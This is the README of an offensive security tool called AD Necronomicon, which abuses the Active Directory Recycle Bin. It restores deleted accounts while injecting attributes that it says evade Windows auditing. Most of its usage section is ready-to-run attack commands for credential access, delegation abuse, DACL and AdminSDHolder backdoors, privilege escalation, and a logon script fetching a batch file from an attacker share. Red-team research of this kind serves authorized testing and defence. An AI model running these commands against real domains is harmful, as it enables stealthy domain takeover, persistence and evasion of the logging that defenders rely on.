# AD Necronomicon
![Python 3 compatible](https://img.shields.io/badge/python-3.x-blue.svg)
![License: MIT](https://img.shields.io/pypi/l/ad-necronomicon.svg)

AD Necronomicon is a proof of concept Python tool for enumerating and exploiting the Active Directory Recycle Bin. It discovers who can access deleted objects, enumerates the recycle bin contents, and restores deleted objects with attacker-controlled attributes injected during the undelete operation.

Built on Black Lantern Security's fork of [Impacket](https://github.com/blacklanternsecurity/impacket).

## How It Works

When the AD Recycle Bin is enabled, deleted objects are preserved with all their attributes intact for a configurable retention period (default 180 days). Objects in this state can be restored via LDAP by removing the `isDeleted` attribute and setting a new `distinguishedName`.

The interesting thing is that LDAP modifications can be bundled with the restore operation. This means attributes like `nTSecurityDescriptor`, `servicePrincipalName`, `userAccountControl`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, and others can be injected in the same request that brings the object back to life. Windows logs only the restore itself (5137 object created + 5138 object undeleted). The injected attribute changes do not generate separate 5136 (object modified), 4738/4742 (account changed), or 4670 (permissions changed) events.

### Requirements

Restoring deleted objects requires two rights:

- **Reanimate Tombstones** extended right on the domain root (granted to Domain Admins by default)
- **List Contents** on the Deleted Objects container (to enumerate what's available)

## Installation

```bash
pipx install .
```

Or via pip in a virtual environment:

```bash
pip install .
```

This installs the `necronomicon` command line tool and pulls in all dependencies, including BLS's Impacket fork.

## Usage

AD Necronomicon has three subcommands:

### enum-access: Discover Who Can Access the Recycle Bin

Enumerates the Reanimate Tombstones extended right on the domain object and List Contents access on the Deleted Objects container. Runs from a low-privilege account. Generates no events in Windows.

```bash
necronomicon enum-access -d corp.local -u lowpriv -k -dc dc01.corp.local
```

Output includes:
- Whether the AD Recycle Bin is enabled
- Tombstone and deleted object lifetimes
- Principals with the Reanimate Tombstones right
- Principals with List Contents on the Deleted Objects container

Optional: `-o findings.json` to write JSON output.

### enum-bin: Enumerate Deleted Objects

Lists all deleted objects in the Recycle Bin, grouped by type and restorability. Requires List Contents on the Deleted Objects container. Generates no events in Windows.

```bash
necronomicon enum-bin -d corp.local -u admin -k -dc dc01.corp.local
```

Output includes:
- Restorable and recycled objects grouped by type (user, computer, group, OU)
- High-value targets flagged with tags (`privileged_group`, `domain_controller`, `privileged_container`, `parent_deleted`)
- Objects with `description` or `info` fields populated (potential credential exposure)
- Structured JSON output written to `deleted_objects.json` (override with `-o`)

### restore: Restore Deleted Objects

Restores a deleted object from the Recycle Bin. Optionally injects arbitrary LDAP attribute modifications during the restore. Targets are specified by GUID, SID, sAMAccountName, or name. Restoring an account creates a 5137 + 5138 event pair in Windows. Injected attributes generate no additional events.

```bash
# Plain restore
necronomicon restore -d corp.local -u admin -k -dc dc01.corp.local --target victim

# Restore and enable the account. Does not generate a 4722 (account enabled) event.
necronomicon restore -d corp.local -u admin -k -dc dc01.corp.local --target victim --enable

# Restore with attribute injection
necronomicon restore -d corp.local -u admin -k -dc dc01.corp.local \
  --target victim --set userAccountControl=544 --set pwdLastSet=0
```

#### Attribute injection flags

| Flag | LDAP Operation | Description |
|------|---------------|-------------|
| `--set ATTR=VALUE` | MODIFY_REPLACE | Set an attribute. Repeatable. |
| `--add ATTR=VALUE` | MODIFY_ADD | Add a value to an attribute. Repeatable. |
| `--del ATTR` | MODIFY_DELETE | Remove an attribute. Repeatable. |

Multiple flags can be combined in a single restore to inject several attributes at once.

#### Security descriptor helpers

Binary security descriptors cannot be passed as CLI strings, so convenience flags handle SD construction:

| Flag | Effect |
|------|--------|
| `--sd-everyone` | Sets `nTSecurityDescriptor` to Everyone:FullControl |
| `--sd-principal SID` | Sets `nTSecurityDescriptor` granting FullControl to the specified SID |
| `--sd-rbcd SID` | Sets `msDS-AllowedToActOnBehalfOfOtherIdentity` with an RBCD SD for the specified SID |

#### Additional options

| Flag | Description |
|------|-------------|
| `--enable` | Clear ACCOUNTDISABLE in userAccountControl so the account is active on restore. Does not generate a 4722 (account enabled) event. |
| `--target-ou DN` | Override the restore location (required if the original parent OU is also deleted) |
| `--restore-name NAME` | Override the restored object's RDN |

#### Examples

**Credential Access**

```bash
# Empty password. Account PASSWD_NOTREQD + pwdLastSet=0
necronomicon restore -d corp.local -u admin -k --target victim \
  --set userAccountControl=544 --set pwdLastSet=0

# Kerberoastable SPN. Request TGS and crack offline
necronomicon restore -d corp.local -u admin -k --target svc_sql \
  --add servicePrincipalName=MSSQLSvc/db.corp.local:1433

# Certificate mapping. Authenticate as the restored account via PKINIT
necronomicon restore -d corp.local -u admin -k --target victim \
  --add altSecurityIdentities='X509:<I>DC=local,DC=corp,CN=corp-CA<S>CN=attacker'
```

**Delegation Abuse**

```bash
# RBCD. S4U2Self/S4U2Proxy impersonation via the restored object
necronomicon restore -d corp.local -u admin -k --target comp$ \
  --sd-rbcd S-1-5-21-...-1234

# Constrained delegation. Impersonate any user to a target SPN
necronomicon restore -d corp.local -u admin -k --target comp$ \
  --set msDS-AllowedToDelegateTo=cifs/dc01.corp.local

# Unconstrained delegation. Capture TGTs from authenticating principals
necronomicon restore -d corp.local -u admin -k --target comp$ \
  --set userAccountControl=528384
```

**Persistence**

```bash
# DACL backdoor. Everyone:FullControl on the restored object
necronomicon restore -d corp.local -u admin -k --target victim \
  --sd-everyone

# DACL backdoor for a specific principal
necronomicon restore -d corp.local -u admin -k --target victim \
  --sd-principal S-1-5-21-...-1234

# Logon script. Code execution when the restored account logs in
necronomicon restore -d corp.local -u admin -k --target victim \
  --set scriptPath='\\attacker\share\run.bat'

# GPO link. Restore a deleted OU with a linked GPO for code execution
necronomicon restore -d corp.local -u admin -k --target 'Finance' \
  --set 'gPLink=[LDAP://CN={GPO-GUID},CN=Policies,CN=System,DC=corp,DC=local;0]'

# AdminSDHolder. Restore into AdminSDHolder so SDProp propagates
# the injected DACL to all protected accounts within 60 minutes
necronomicon restore -d corp.local -u admin -k --target victim \
  --sd-everyone \
  --target-ou 'CN=AdminSDHolder,CN=System,DC=corp,DC=local'
```

**Privilege Escalation**

```bash
# Group member injection. Restore a deleted group with an injected member
necronomicon restore -d corp.local -u admin -k --target yourgroup \
  --add member='CN=Attacker,CN=Users,DC=corp,DC=local'

# RODC password reveal. Add Domain Admins to the RODC replication allow list
necronomicon restore -d corp.local -u admin -k --target fakeRODC$ \
  --add msDS-RevealOnDemandGroup='CN=Domain Admins,CN=Users,DC=corp,DC=local'
```

**Combined**

```bash
# Restore with a new name into a specific OU
necronomicon restore -d corp.local -u admin -k --target victim \
  --target-ou 'OU=Servers,DC=corp,DC=local' --restore-name svc_backup

# Stack multiple injections in a single restore
necronomicon restore -d corp.local -u admin -k --target victim \
  --set userAccountControl=528384 \
  --add servicePrincipalName=HTTP/web.corp.local \
  --sd-everyone
```

## Authentication

Kerberos is the default authentication method. NTLM requires an explicit `--auth-method ntlm` flag.

| Method | Flags |
|--------|-------|
| Kerberos with password | `-d corp.local -u user` (prompted for password) |
| Kerberos with ccache | `-d corp.local -u user -k` (reads `KRB5CCNAME`) |
| Kerberos with AES key | `-d corp.local -u user --aeskey <hex>` |
| Kerberos with NT hash | `-d corp.local -u user -H :NTHASH` |
| NTLM (explicit only) | `-d corp.local -u user --auth-method ntlm` |

Additional connection options:

| Flag | Description |
|------|-------------|
| `-dc HOST` | Target DC hostname (auto-discovered via DNS SRV if omitted) |
| `-ns IP` | DNS server to use for resolution |
| `--ldaps` | Use LDAPS (port 636) |
| `--channel-binding` | Use LDAP channel binding |
| `--dns-tcp` | Use TCP for DNS queries |
| `-v` | Verbose/debug output |

## Credits

AD Necronomicon was written by [Black Lantern Security](https://www.blacklanternsecurity.com). The authentication and LDAP implementation is based on [BloodHound.py](https://github.com/dirkjanm/BloodHound.py) by Dirk-jan Mollema.

## Disclaimer

This tool is for authorized security testing only. Use responsibly and only on systems you have explicit permission to test.
